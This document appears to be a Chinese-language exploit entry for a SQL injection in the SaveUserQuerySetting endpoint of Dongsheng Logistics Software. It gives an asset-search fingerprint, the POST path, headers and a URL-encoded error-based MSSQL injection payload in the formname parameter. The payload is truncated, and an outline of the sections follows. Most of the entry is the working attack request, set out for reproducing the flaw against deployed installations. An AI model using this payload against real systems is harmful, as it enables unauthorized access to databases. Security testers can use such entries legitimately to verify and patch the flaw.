# 东胜物流软件SaveUserQuerySetting存在SQL注入漏洞

- **系统**：东胜物流软件　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"Z4c2hPCi5IR/AnH5vZXNSQ=="`
- **请求**：`POST /MvcShipping/MsBaseInfo/SaveUserQuerySetting HTTP/1.1`
- **关键头**：`Content-Length: 857`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
formname=MsRptSaleBalProfitShareIndex'+AND+2523+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT+SUBSTRING((ISNULL(CAST((+sys.fn_VarBinToHexStr(hashbytes('MD5','hello')))+AS+NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))+AND+'uKco'%3d'uKco&isvisible=true&issavevalue=true&querydetail=%7B%22PS_MBLNO%22%3A%22%22%2C%22PS_VESSEL%22%3A%22%22%2C%22PS_VOYNO%22%3A%22%22%2C%22PS_SALE%22%3A%22%5Cu91d1%5Cu78ca%22%2C%22PS_OP%22%3Anull%2C%22PS_EXPDATEBGN%22%3A%222020-02-01%22%2C%22PS_EXPDATEEND%22%3A%222020-02-29%22%2C%22PS_ST…（脚本共 902 字，完整版见原文）
```

**其他**
- 东胜物流软件SaveUserQuerySetting存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 东胜物流软件